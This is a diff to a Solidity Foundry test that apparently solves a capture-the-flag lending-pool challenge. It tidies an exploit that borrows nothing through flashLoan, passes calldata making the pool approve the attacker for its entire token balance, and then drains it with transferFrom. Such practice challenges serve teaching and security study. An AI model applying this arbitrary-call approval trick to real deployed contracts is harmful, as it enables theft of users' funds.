@@ -46,22 +46,16 @@ contract TrusterTest is BaseTest {
 
     function exploit() internal override {
         /** CODE YOUR EXPLOIT HERE */
-
+        vm.startPrank(attacker);
         uint256 poolBalance = token.balanceOf(address(pool));
-
-        // Act as the attacker
-        vm.prank(attacker);
-        // make the pool approve the attacker to manage the whole pool balance while taking a free loan
         bytes memory attackCallData = abi.encodeWithSignature(
             "approve(address,uint256)",
             attacker,
             poolBalance
         );
         pool.flashLoan(0, attacker, address(token), attackCallData);
-
-        // now steal all the funds
-        vm.prank(attacker);
         token.transferFrom(address(pool), attacker, poolBalance);
+        vm.stopPrank();
     }
 
     function success() internal override {
